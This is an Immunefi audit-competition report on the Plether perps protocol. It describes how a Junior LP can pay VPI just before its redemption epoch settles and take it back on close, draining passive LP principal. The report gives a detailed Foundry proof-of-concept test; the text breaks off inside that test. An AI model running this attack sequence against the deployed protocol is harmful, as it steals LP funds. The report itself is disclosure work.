# \#99170 [SC-Critical] A Junior LP can pay VPI just before its redemption is priced and take it back right after, draining passive Junior principal

**Submitted on Nov 12th 2026 at 09:35:52 UTC by @thimthor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99170
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

In the PoC, on a flat book with no other open positions, with an attacker holding 80% of Junior, a passive 10M Junior LP loses 319,149 USDG (3.19%) in 26 hours. The attacker nets +206,780 after all fees and the rest goes to execution fees. It uses only public calls and needs no skew from other traders.

## Relevant Context

- **VPI.** A trade pays `C(S_post) − C(S_pre)` with `C(S) = k·S²/(2D)` (skew `S`, pool depth `D`, `k = vpiFactor = 0.01`). A trade that raises skew pays VPI `P` into pool cash. When the same position closes and skew returns to where it was, the curve pays `P` back. A lifetime clamp stops the rebate from exceeding what the position paid.
- **LP epochs.** Junior deposits and redemptions are queued and priced together at an hourly epoch boundary. After the boundary anyone can call `OrderRouter.settleLpEpoch`, which reconciles the pool and prices every matured request at `juniorPrincipal / supply` at that instant. There is no exit fee in a live market.
- **Waterfall.** Revenue first restores Senior up to its high-water mark; everything else goes to Junior. Senior is at its high-water mark unless a loss has impaired it, so in normal operation all VPI lands in Junior.

## Finding Description

Positive VPI held by open positions is a refundable deposit: when skew unwinds, the curve pays it back. The pool nevertheless counts it as Junior equity the moment it is paid, and LP settlement prices exits and entries on that equity. Whoever controls the timing of the close controls which LP cohort keeps the VPI, and a trader who is also a Junior LP controls it. GMX v2 handles the equivalent value differently: `MarketUtils.getPoolValueInfo` deducts its position-impact pool from LP pool value and releases it to LPs over time.

**1. Open-side VPI is booked as pool revenue.** `tradeCostAssets` is VPI plus the execution fee; the part not sent to the treasury is recorded as `Revenue` that arrived as cash:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol:454-463 (executeOpen)
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
@>              IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

In a funded pool, `recordClaimantInflow` only does `accountedAssets += amount` (`HousePool.sol:641`). Nothing records that an open position can reclaim this cash.

**2. The next reconcile hands it to Junior.** The pool's distributable equity is physical assets minus trader claims plus the price-only terminal delta (`HousePoolAccountingLib.sol:60-77`). It has no term for positive VPI held by open positions. The increase goes through `distributeRevenue`:

```solidity
// packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol:140-159
@>  nextState.juniorPrincipal += remaining;
```

**3. LP settlement prices redemptions on that principal:**

```solidity
// packages/perps/src/HousePool.sol:835-841 (_settleLpEpoch)
@>  _reconcile(accountingSnapshot, statusSnapshot);
    _checkpointEngineCarryIndexes();

    result.cutoffEpoch = cutoffEpoch;
    RedemptionPhase memory juniorPhase;
@>  juniorPhase.pricingPrincipal = juniorPrincipal;
    juniorPhase.pricingSupply = _juniorShareSupply();
```

**4. The same position then takes `P` back.** On close, the VPI curve pays the rebate and the clamp limits it to what the position paid:

```solidity
// packages/perps/src/libraries/CloseAccountingLib.sol:103-118
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
...
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
...
@>  if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
@>      state.vpiDeltaAssets = -state.proportionalAccrualAssets;
    }
```

**The attack.** An attacker holding a share `f` of Junior repeats this cycle, each step a separate public transaction:

1. Request redemption of all its Junior shares.
2. About 60 s before the epoch boundary, commit an open that increases skew (in the direction of any existing skew). Any keeper executes it and VPI `P` enters pool cash.
3. After the boundary, any keeper calls `settleLpEpoch`. The redemption is priced on Junior principal that includes `P`.
4. Commit a full close. Any keeper executes it and the position gets `P` back.
5. Claim the redeemed USDG, re-deposit at the now-fair price, and repeat. One cycle (one epoch to redeem, one to re-deposit, and the 1-hour deposit cooldown) takes about 2h53m.

The attacker's redemption gains about `f·P`. Its trading legs cost only the two 4 bps execution fees and a small confidence spread, since the VPI comes back. Passive Junior LPs pay the `f·P`. Depositors whose deposits activate in the same settlement buy at the inflated price and share the loss.

No privileged role, atomic transaction or price movement is needed. Keepers are untrusted and the attacker can execute its own orders and call `settleLpEpoch` itself; the PoC uses a separate keeper to show the attacker needs no control over ordering. If another trader reduces skew between the attacker's open and close, the attacker's rebate shrinks. That is a risk to the attacker only.

**Why this is not covered by documented behavior or known issues:**

- **The docs describe VPI moving share value, not one holder choosing who pays it.** The [LP quickstart](https://docs.plether.com/get-started/liquidity-provider-quickstart) says share value *"may increase through … positive VPI"* and *"may decrease when … VPI rebates … flow through the waterfall"*, and positive VPI is *"pool trading revenue owned by LPs"* ([Trading costs](https://docs.plether.com/how-plether-works/trading-costs-fees-carry-and-vpi)). That describes the direction of NAV under ordinary trading. Here one actor pays VPI in and takes it back around its own pricing, so the pool earns nothing and the attacker's gain comes from other LPs. This contradicts the protocol's stated intent: the trading-costs page says the clamp means a closing rebate *"cannot turn the round trip into pure rebate income"*, and the [AI trading agents](https://docs.plether.com/welcome/ai-trading-agents) page says VPI *"cannot become an income stream. If your agent wants the pool's liquidity economics, it commits capital as an LP."* Holding both roles turns the round trip into income paid by other LPs. Being an LP does not entitle the attacker to this: passive LPs end up funding a rebate on VPI the pool never kept.
- **Existing protections cover other cases.** The lifetime clamp (`SECURITY.md:1443`, *"intentionally zeroes otherwise extractable rebate-only round trips"*, and the clamp's "LP sandwich" comment) stops a trader from receiving net VPI; here the trader receives none. The anticipated-VPI rule (`SECURITY.md:871-872`) and the negative-VPI reserve that *"cannot be extracted by LPs"* (`ACCOUNTING_SPEC.md:821-822`) keep contingent VPI out of NAV. Nothing covers positive VPI that its payer can still reclaim: its cash sits in NAV.
- **Not the known depth-manipulation issue (SCAN-31).** SCAN-31 is about a reduced pool depth inflating a close rebate above what the unmanipulated curve pays. In the multi-cycle runs depth does fall after the redemption and the clamp trims the rebate to `P`. `test_constantDepth_curveAloneRefundsP` removes that factor: depth is unchanged, the rebate is the raw curve value and below `P`, and the attacker still profits. A fix for SCAN-31, such as snapshotting depth, would not stop this attack.
- **Not the accepted timing risks.** Three passages accept that LP pricing moves with timing:
  - the whitepaper's deposit-epoch note that finalization *"still has timing and liveness risk because requests have neither an auction nor a user-specified share-price limit"* (`WHITEPAPER.md:1793-1796`);
  - `SECURITY.md:1048`, which says trading during the pre-settlement quiet period *"can change NAV"*;
  - `ACCOUNTING_SPEC.md:737-740`, which *"intentionally allows a trader and incoming LP to time collection"* of carry.

  These cover NAV drift a requester cannot predict, and real carry revenue landing with a different LP. Here the attacker sets both the charge and its refund, net VPI is zero, and passive LPs lose principal.

## Impact Explanation

Passive Junior LPs lose principal in every cycle, and the attacker keeps it. The PoC measures this over 9 cycles in 26 hours with release parameters, a 10M passive Junior LP, 30M Senior and a constant price, against an honest run with the same deposits, redemptions and timing but no attacker trades:

| Scenario | Attacker share of Junior | Passive LP loss | Attacker net | Execution fees to treasury |
|---|---|---|---|---|
| Flat book; attacker trades 39% of depth | 80% | 319,149 USDG (3.19%) | +206,780 | 112,399 |
| Opportunistic variant: another trader holds 25% skew; attacker adds 14% of depth | 33% | 35,700 USDG (0.36%) | +13,010 | 22,693 |

- The passive LP's loss equals the attacker's net gain plus the treasury fees the attacker's trades paid. Senior is unchanged.
- In the flat-book run the passive LP ends at 9,677,399 USDG against 9,996,548 in the honest run, after depositing 10,000,000. (The honest run is slightly below 10M because Junior pays the Senior coupon.) The attacker ends with +202,834 more USDG than it was ever given (honest run: −3,946).
- The flat-book drain needs nothing from other traders and repeats every cycle for as long as the attacker keeps its share. Amounts scale with pool size.
- **Existing skew is optional.** It lowers the Junior share needed, because each unit of attacker notional then moves more VPI. Every cycle is independent, so the attacker can act only at boundaries where other traders already hold skew; it does not need that skew to persist. The PoC holds 25% skew across all 9 cycles only to keep the run simple; a single such cycle nets +1,415 at a 33% share (`test_attackerNetByJuniorShare`). 25% is a high skew against the 40% cap, not a typical state; at lower existing skew the share needed moves toward the flat-book 44%. In this variant more than half the passive LP's loss goes to fees, but the attacker still profits, so it is theft with a profit motive, not griefing.

## Recommendation

Do not count positive VPI that open positions can still reclaim as Junior equity when pricing LP entries and exits.

- **Simple fix:** vest positive VPI into Junior principal over several epochs, and pay close rebates from the unvested balance first. A round trip around one settlement then captures at most what vested in that epoch.
- **Precise fix:** keep a running total of `max(vpiAccrued, 0)` over open positions, capped at the current curve value `C(|S|, D)`, and subtract it from the equity used for LP pricing (not from the depth used for VPI or the skew cap). Release it gradually as positions close or are liquidated, so a depositor cannot capture a lump release.

GMX v2 handles the same problem this way: `MarketUtils.getPoolValueInfo` deducts the position-impact pool from LP pool value, and the pool is distributed to LPs over time.


## Proof of Concept

## Proof of Concept

Add the following test file to `packages/perps/test/perps/spec/lp/VpiRoundTripAroundLpSettlement.t.sol`. It uses the repository's `BasePerpTest` fixture (mocked Pyth and USDG, as the competition rules allow), applies the release parameters from `packages/perps/DEPLOYMENT.md` and asserts them in `setUp`, and changes no in-scope contract. The attacker only calls `requestDeposit`, `claimDeposit`, `requestRedeem`, `redeem`, `commitOrder` and the clearinghouse `deposit`. A separate `KEEPER` address executes every order and calls every `settleLpEpoch`. The helpers under `// Public-path helpers` only wrap these public calls.

The five tests:

- `test_singleEpoch_redemptionIsPricedWithRefundableVpi`: one cycle. The key assertion is `assertGe(atkPricing, basePricing + uint256(vpiPaid))`: Junior principal used for pricing includes `P`. The close returns `P`, the attacker profits and the passive LP loses.
- `test_constantDepth_curveAloneRefundsP`: same cycle with depth held constant by an unrelated same-epoch deposit. The close rebate is the raw curve value, the clamp does not bind, and the attacker still profits. This rules out depth manipulation.
- `test_multiCycle_80PercentShare_flatBook` and `test_multiCycle_33PercentShare_existingSkew`: 9 cycles against an honest run (the table above). The second holds 25% skew in every cycle for simplicity; the attack does not require that.
- `test_attackerNetByJuniorShare`: single-cycle attacker net at several Junior shares, and at the 10 bp confidence ceiling (the break-even points above).

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdMath} from "@plether/perps/CfdMath.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @title VPI round trip around LP settlement drains passive Junior LPs
/// @notice A skew-increasing open pays VPI `P` into HousePool, and the next reconcile books it as Junior principal.
///         The same position gets `P` back when it closes. `HousePool._settleLpEpoch` prices Junior redemptions on the
///         principal of that instant, so an attacker who holds Junior shares opens just before its redemption is
///         priced and closes right after. Its redemption includes its share of `P`; passive Junior LPs pay for it.
///         Every step is a separate public transaction. A neutral KEEPER executes every order and settles every
///         epoch. The basket price is constant, so the only value moving is VPI, fees and the confidence spread.
contract VpiRoundTripAroundLpSettlementTest is BasePerpTest {

    uint256 internal constant SENIOR_DEPOSIT = 30_000_000e6;
    uint256 internal constant VICTIM_JUNIOR = 10_000_000e6;
    uint256 internal constant CYCLES = 9;
    uint256 internal constant MAX_TOTAL_SKEW_BPS = 3900; // total skew after the attacker's open: 39% (cap is 40%)
    uint256 internal constant PRICE = 1e8; // constant basket price
    uint256 internal constant PRE_BOUNDARY = 60 seconds; // the attacker opens 60s before the epoch boundary

    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant VICTIM_LP = address(0xB0B); // passive Junior LP
    address internal constant ATTACKER_LP = address(0xA77); // attacker's Junior account
    address internal constant TRADER_A = address(0xA77A); // attacker's trading account
    address internal constant KEEPER = address(0xEE9); // neutral third-party keeper
    address internal constant ORGANIC = address(0x0E6A); // unrelated trader holding pre-existing skew
    address internal constant NEW_LP = address(0xD3F0); // unrelated LP whose deposit activates with the redemption

    uint256 internal leg; // current trade size in 18-decimal tokens
    uint256 internal legMargin;
    uint256 internal attackerMinted; // all USDG ever minted to ATTACKER_LP and TRADER_A
    uint256 internal nominalFees; // 4 bps of every attacker open and close
    uint256 internal organicSkewBps; // ORGANIC LONG as a share of depth (0 = flat book)
    uint64 internal pythConf = 10_000; // Pyth confidence on each feed: 1 bp of PRICE

    struct Outcome {
        uint256 attackerLpUsdg;
        uint256 attackerTradingUsdg;
        int256 attackerAbsoluteProfit;
        uint256 victimValue;
        uint256 seniorValue;
        uint256 treasuryFees;
        uint256 elapsed;
    }

    struct ConstantDepthEpoch {
        uint256 redeemed;
        int256 pOpen; // VPI charged on the pre-boundary open
        int256 refundClose; // VPI rebated on the post-settlement close
        uint256 curveRefund; // raw VPI curve rebate at the close depth, before the lifetime clamp
        uint256 depthBeforeOpen;
        uint256 depthBeforeClose;
    }

    // Release risk parameters (packages/perps/DEPLOYMENT.md, "Initial release parameters").
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.basketMaxConfidenceRatioBps = 10;
        config.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(config);
        _setSeniorCapacity(40_000_000e6, 8000);
        _assertReleaseConfig();

        // Next Monday morning: no weekend or FAD window during the run.
        vm.warp(SETUP_TIMESTAMP + ((block.timestamp - SETUP_TIMESTAMP) / 7 days + 1) * 7 days);

        _fundJunior(VICTIM_LP, VICTIM_JUNIOR);
        _fundSenior(SENIOR_LP, SENIOR_DEPOSIT);
    }

    // ---------------------------------------------------------------------
    // 1. Mechanism: one epoch, flat book, attacker holds 80% of Junior
    // ---------------------------------------------------------------------

    function test_singleEpoch_redemptionIsPricedWithRefundableVpi() public {
        _enterAttacker(40_000_000e6);
        uint256 snap = vm.snapshotState();
        (uint256 basePricing, uint256 baseRedeemed,) = _redemptionEpoch(false);
        uint256 baseVictim = _juniorValue(VICTIM_LP);
        assertTrue(vm.revertToState(snap));

        uint256 traderBefore = clearinghouse.balanceAssets(TRADER_A);
        (uint256 atkPricing, uint256 atkRedeemed, int256 vpiPaid) = _redemptionEpoch(true);
        uint256 traderCost = traderBefore - clearinghouse.balanceAssets(TRADER_A);
        uint256 atkVictim = _juniorValue(VICTIM_LP);

        emit log_named_decimal_int("VPI P paid by the pre-boundary open", vpiPaid, 6);
        emit log_named_decimal_uint("Junior principal used for pricing, honest", basePricing, 6);
        emit log_named_decimal_uint("Junior principal used for pricing, attack", atkPricing, 6);
        emit log_named_decimal_uint("attacker redeemed, honest", baseRedeemed, 6);
        emit log_named_decimal_uint("attacker redeemed, attack", atkRedeemed, 6);
        emit log_named_decimal_uint("attacker trading cost (open + close)", traderCost, 6);
        emit log_named_decimal_int("ATTACKER NET", int256(atkRedeemed) - int256(baseRedeemed) - int256(traderCost), 6);
        emit log_named_decimal_uint("VICTIM LOSS", baseVictim - atkVictim, 6);

        assertGt(vpiPaid, 0, "open paid positive VPI");
        assertEq(_size(TRADER_A), 0, "position fully closed");
        assertGe(atkPricing, basePricing + uint256(vpiPaid), "redemption priced with P inside Junior principal");
        assertLt(traderCost, uint256(vpiPaid), "P came back on close: trading cost is below P");
        assertGt(atkRedeemed - baseRedeemed, traderCost, "attacker profits");
        assertGt(baseVictim, atkVictim, "passive Junior loses");
    }

    // ---------------------------------------------------------------------
    // 2. Control: depth held constant, the raw VPI curve alone refunds P
    // ---------------------------------------------------------------------

    /// An unrelated 40M Junior deposit activates in the same settlement as the attacker's 40M redemption, so depth is
    /// the same at the open and at the close. The close rebate is the plain curve value and the lifetime clamp does
    /// not bind. The new depositor buys its shares at the inflated price and bears the loss.
    function test_constantDepth_curveAloneRefundsP() public {
        _enterAttacker(40_000_000e6);
        uint256 snap = vm.snapshotState();
        ConstantDepthEpoch memory base = _constantDepthEpoch(false);
        uint256 baseVictim = _juniorValue(VICTIM_LP);
        uint256 baseNewLp = _juniorValue(NEW_LP);
        assertTrue(vm.revertToState(snap));

        uint256 traderBefore = clearinghouse.balanceAssets(TRADER_A);
        ConstantDepthEpoch memory atk = _constantDepthEpoch(true);
        uint256 traderCost = traderBefore - clearinghouse.balanceAssets(TRADER_A);
        uint256 atkVictim = _juniorValue(VICTIM_LP);
        uint256 atkNewLp = _juniorValue(NEW_LP);
        int256 attackerNet = int256(atk.redeemed) - int256(base.redeemed) - int256(traderCost);

        emit log_named_decimal_uint("pool depth at open", atk.depthBeforeOpen, 6);
        emit log_named_decimal_uint("pool depth at close", atk.depthBeforeClose, 6);
        emit log_named_decimal_int("VPI P charged on open", atk.pOpen, 6);
        emit log_named_decimal_int("VPI rebated on close", atk.refundClose, 6);
        emit log_named_decimal_uint("raw curve rebate at close depth", atk.curveRefund, 6);
        emit log_named_decimal_int("ATTACKER NET", attackerNet, 6);
        emit log_named_decimal_int("NEW_LP LOSS", int256(baseNewLp) - int256(atkNewLp), 6);
        emit log_named_decimal_int(
            "PASSIVE JUNIOR LOSS (victim + NEW_LP)", int256(baseVictim + baseNewLp) - int256(atkVictim + atkNewLp), 6
        );

        assertApproxEqRel(atk.depthBeforeClose, atk.depthBeforeOpen, 0.01e18, "depth unchanged within 1%");
        assertApproxEqAbs(atk.refundClose, int256(atk.curveRefund), 1e6, "close rebate is the raw curve value");
        assertLt(atk.refundClose, atk.pOpen, "rebate below P: lifetime clamp not binding");
        assertApproxEqRel(atk.refundClose, atk.pOpen, 0.001e18, "curve refunds P within 0.1%");
        assertGt(attackerNet, 0, "attacker profits");
        assertGt(baseNewLp, atkNewLp, "new depositor overpays");
        assertGt(baseVictim + baseNewLp, atkVictim + atkNewLp, "passive Junior loses");
    }

    // ---------------------------------------------------------------------
    // 3. Repeated attack over 26 hours (9 cycles)
    // ---------------------------------------------------------------------

    /// Attacker holds 33% of Junior. An unrelated trader already holds a LONG of 25% of depth; each cycle the attacker
    /// adds a LONG of 14% of depth (39% in total).
    function test_multiCycle_33PercentShare_existingSkew() public {
        organicSkewBps = 2500;
        uint256 capital = 5_000_000e6;
        settlementToken.mint(ATTACKER_LP, capital);
        _publicJuniorDeposit(capital);
        uint256 margin = 2 * (pool.totalAssets() * (MAX_TOTAL_SKEW_BPS - organicSkewBps) / 10_000) / 20;
        _fundTrader(TRADER_A, margin);
        attackerMinted = capital + margin;
        _openOrganicLong();
        emit log_named_decimal_uint("attacker share of Junior %", capital * 1e6 / (capital + VICTIM_JUNIOR), 4);
        emit log_named_decimal_uint("attacker USDG ever minted", attackerMinted, 6);

        (Outcome memory base, Outcome memory atk) = _runBoth();
        (int256 victimLoss,) = _logResult(base, atk);

        assertGt(victimLoss, 0, "victim Junior loses");
        assertGt(atk.attackerAbsoluteProfit, base.attackerAbsoluteProfit, "attack beats honest run");
        assertGt(atk.attackerAbsoluteProfit, 0, "attacker ends with more USDG than it was ever given");
        assertApproxEqAbs(atk.seniorValue, base.seniorValue, 1e6, "Senior unchanged");
    }

    /// Attacker holds 80% of Junior on a flat book and opens a LONG of 39% of depth each cycle.
    function test_multiCycle_80PercentShare_flatBook() public {
        _enterAttacker(40_000_000e6);
        (Outcome memory base, Outcome memory atk) = _runBoth();
        (int256 victimLoss, int256 attackerNet) = _logResult(base, atk);
        uint256 tradingCost = base.attackerTradingUsdg - atk.attackerTradingUsdg;
        emit log_named_decimal_uint("attacker trading cost", tradingCost, 6);
        emit log_named_decimal_uint("nominal execution fees (4 bps x 2 x 9)", nominalFees, 6);

        assertGt(victimLoss * 1000, int256(base.victimValue) * 15, "victim Junior loses more than 1.5%");
        assertGt(atk.attackerAbsoluteProfit, 0, "attacker ends with more USDG than it was ever given");
        assertApproxEqAbs(atk.seniorValue, base.seniorValue, 1e6, "Senior unchanged");
        // No VPI is kept by the trading legs: they cost only the execution fees plus a small confidence spread.
        assertGe(tradingCost, nominalFees, "trading legs gain no VPI");
        assertLe(tradingCost, nominalFees * 11 / 10, "VPI refunded: trading cost <= 1.1 x execution fees");
        // Victim loss = attacker net + fees credited to the treasury.
        assertApproxEqAbs(victimLoss, attackerNet + int256(atk.treasuryFees - base.treasuryFees), 100e6, "conservation");
    }

    // ---------------------------------------------------------------------
    // 4. Single-epoch attacker net by Junior share
    // ---------------------------------------------------------------------

    function test_attackerNetByJuniorShare() public {
        emit log_string("=== flat book: attacker opens 39% of depth");
        int256 flat41 = _singleEpochNet(7_000_000e6);
        int256 flat50 = _singleEpochNet(10_000_000e6);

        emit log_string("=== 25% existing skew: attacker opens 14% of depth");
        organicSkewBps = 2500;
        int256 skew29 = _singleEpochNet(4_000_000e6);
        int256 skew33 = _singleEpochNet(5_000_000e6);

        // Release confidence ceiling (basketMaxConfidenceRatioBps = 10): the adverse-confidence spread is 10x larger.
        emit log_string("=== 25% existing skew, 10 bp Pyth confidence (release ceiling)");
        pythConf = 100_000;
        int256 maxConf41 = _singleEpochNet(7_000_000e6);

        assertLt(flat41, 0, "flat book: below break-even at 41%");
        assertGt(flat50, 0, "flat book: profitable at 50%");
        assertGt(skew29, 0, "25% skew: profitable at 28.6%");
        assertGt(skew33, skew29, "profit grows with share");
        assertGt(maxConf41, 0, "10 bp confidence, 25% skew: profitable at 41%");
    }

    // ---------------------------------------------------------------------
    // Scenario drivers
    // ---------------------------------------------------------------------

    /// Runs CYCLES redemption epochs honestly and then, from the same state, with the attack.
    function _runBoth() internal returns (Outcome memory base, Outcome memory atk) {
        uint256 snap = vm.snapshotState();
        emit log_string("--- honest baseline (same deposits, redemptions and timing, no attacker trades)");
        base = _run(false);
        assertTrue(vm.revertToState(snap));
        nominalFees = 0;
        emit log_string("--- attack");
        atk = _run(true);
    }

    function _run(
        bool attack
    ) internal returns (Outcome memory out) {
        uint256 start = vm.getBlockTimestamp();
        uint256 treasuryBefore = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        for (uint256 c = 1; c <= CYCLES; ++c) {
            _redemptionEpoch(attack);
            if (c < CYCLES) {
                _publicJuniorDeposit(settlementToken.balanceOf(ATTACKER_LP));
            }
        }
        out.attackerLpUsdg = settlementToken.balanceOf(ATTACKER_LP) + _juniorValue(ATTACKER_LP);

        // Close the unrelated position too, so both runs end with an empty book.
        if (_size(ORGANIC) > 0) {
            leg = _size(ORGANIC);
            _trade(ORGANIC, CfdTypes.Side.LONG, 0, true);
        }
        assertEq(engine.traderClaimBalanceAssets(TRADER_A), 0, "no deferred trader claim");

        out.attackerTradingUsdg = clearinghouse.balanceAssets(TRADER_A);
        out.attackerAbsoluteProfit =
            int256(settlementToken.balanceOf(ATTACKER_LP) + out.attackerTradingUsdg) - int256(attackerMinted);
        out.victimValue = _juniorValue(VICTIM_LP);
        out.seniorValue = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_LP));
        out.treasuryFees = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT) - treasuryBefore;
        out.elapsed = vm.getBlockTimestamp() - start;
    }

    /// One redemption of all attacker Junior shares. Each step is its own transaction:
    ///   boundary - 60s : attacker commits the open; next block KEEPER executes it
    ///   boundary + 1s  : KEEPER calls OrderRouter.settleLpEpoch
    ///   afterwards     : attacker commits the full close; next block KEEPER executes it; attacker claims USDG
    function _redemptionEpoch(
        bool attack
    ) internal returns (uint256 pricingPrincipal, uint256 redeemed, int256 vpiPaid) {
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _tick();
        vm.prank(KEEPER);
        router.updateMarkPrice(_oracleData());
        uint256 shares = juniorVault.balanceOf(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 requestId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
        uint256 boundary = juniorVault.depositEpochStart(requestId);

        vm.warp(boundary - PRE_BOUNDARY);
        if (attack) {
            _sizeLeg();
            _trade(TRADER_A, CfdTypes.Side.LONG, legMargin, false);
            vpiPaid = _vpiAccrued(TRADER_A);
        }

        vm.warp(boundary);
        _tick();
        vm.prank(KEEPER);
        router.settleLpEpoch(_oracleData());
        uint256 principalAfter = pool.juniorPrincipal();

        if (attack) {
            _trade(TRADER_A, CfdTypes.Side.LONG, 0, true);
            assertEq(_size(TRADER_A), 0, "A fully closed");
            nominalFees += 2 * ((leg / 1e12) * engine.executionFeeBps() / 10_000);
        }

        assertEq(juniorVault.pendingRedeemRequest(requestId, ATTACKER_LP), 0, "redemption fully funded");
        vm.startPrank(ATTACKER_LP);
        redeemed = juniorVault.redeem(juniorVault.maxRedeem(ATTACKER_LP), ATTACKER_LP, ATTACKER_LP);
        vm.stopPrank();
        assertGt(redeemed, 0, "redemption paid");
        pricingPrincipal = principalAfter + redeemed;
    }

    /// Like `_redemptionEpoch`, but NEW_LP's 40M Junior deposit activates in the same settlement.
    function _constantDepthEpoch(
        bool attack
    ) internal returns (ConstantDepthEpoch memory r) {
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _tick();
        vm.prank(KEEPER);
        router.updateMarkPrice(_oracleData());
        uint256 shares = juniorVault.balanceOf(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
        uint256 boundary = juniorVault.depositEpochStart(redeemId);

        settlementToken.mint(NEW_LP, 40_000_000e6);
        vm.startPrank(NEW_LP);
        settlementToken.approve(address(juniorVault), 40_000_000e6);
        uint256 depositId = juniorVault.requestDeposit(40_000_000e6, NEW_LP, NEW_LP);
        vm.stopPrank();
        assertEq(juniorVault.depositEpochStart(depositId), boundary, "deposit and redemption settle together");

        vm.warp(boundary - PRE_BOUNDARY);
        if (attack) {
            _sizeLeg();
            r.depthBeforeOpen = pool.totalAssets();
            _trade(TRADER_A, CfdTypes.Side.LONG, legMargin, false);
            r.pOpen = _vpiAccrued(TRADER_A);
        }

        vm.warp(boundary);
        _tick();
        vm.prank(KEEPER);
        router.settleLpEpoch(_oracleData());
        vm.prank(NEW_LP);
        juniorVault.claimDeposit(depositId, 40_000_000e6, NEW_LP, NEW_LP);

        if (attack) {
            r.depthBeforeClose = pool.totalAssets();
            ICfdEngineTypes.ClosePreview memory preview = engineLens.previewClose(TRADER_A, leg, PRICE);
            r.refundClose = -preview.vpiDeltaAssets;
            r.curveRefund = uint256(-CfdMath.calculateVPI(leg * PRICE / 1e20, 0, r.depthBeforeClose, 0.01e18));
            _trade(TRADER_A, CfdTypes.Side.LONG, 0, true);
            assertEq(_size(TRADER_A), 0, "A fully closed");
        }

        assertEq(juniorVault.pendingRedeemRequest(redeemId, ATTACKER_LP), 0, "redemption fully funded");
        vm.startPrank(ATTACKER_LP);
        r.redeemed = juniorVault.redeem(juniorVault.maxRedeem(ATTACKER_LP), ATTACKER_LP, ATTACKER_LP);
        vm.stopPrank();
    }

    /// Attacker enters with `capital`, then one honest epoch vs one attack epoch from the same state.
    /// Returns attacker net = extra USDG redeemed - trading cost.
    function _singleEpochNet(
        uint256 capital
    ) internal returns (int256 net) {
        uint256 outer = vm.snapshotState();
        _enterAttacker(capital);
        if (organicSkewBps > 0) {
            _openOrganicLong();
        }
        uint256 inner = vm.snapshotState();
        (, uint256 baseRedeemed,) = _redemptionEpoch(false);
        assertTrue(vm.revertToState(inner));
        uint256 traderBefore = clearinghouse.balanceAssets(TRADER_A);
        (, uint256 atkRedeemed,) = _redemptionEpoch(true);
        uint256 traderCost = traderBefore - clearinghouse.balanceAssets(TRADER_A);
        net = int256(atkRedeemed) - int256(baseRedeemed) - int256(traderCost);

        emit log_named_decimal_uint("attacker share of Junior %", capital * 1e6 / (capital + VICTIM_JUNIOR), 4);
        emit log_named_decimal_int("  attacker net", net, 6);
        assertTrue(vm.revertToState(outer));
    }

    function _logResult(
        Outcome memory base,
        Outcome memory atk
    ) internal returns (int256 victimLoss, int256 attackerNet) {
        victimLoss = int256(base.victimValue) - int256(atk.victimValue);
        attackerNet = int256(atk.attackerLpUsdg + atk.attackerTradingUsdg)
            - int256(base.attackerLpUsdg + base.attackerTradingUsdg);

        emit log_string("--- result (all positions closed in both runs)");
        emit log_named_decimal_uint("victim Junior value, honest", base.victimValue, 6);
        emit log_named_decimal_uint("victim Junior value, attack", atk.victimValue, 6);
        emit log_named_decimal_int("VICTIM LOSS", victimLoss, 6);
        emit log_named_decimal_uint("VICTIM LOSS %", uint256(victimLoss) * 1e6 / base.victimValue, 4);
        emit log_named_decimal_int("ATTACKER NET (attack - honest)", attackerNet, 6);
        emit log_named_decimal_int("attacker profit over all USDG minted to it, honest", base.attackerAbsoluteProfit, 6);
        emit log_named_decimal_int("attacker profit over all USDG minted to it, attack", atk.attackerAbsoluteProfit, 6);
        emit log_named_decimal_uint(
            "execution fees to treasury (attack - honest)", atk.treasuryFees - base.treasuryFees, 6
        );
        emit log_named_decimal_int(
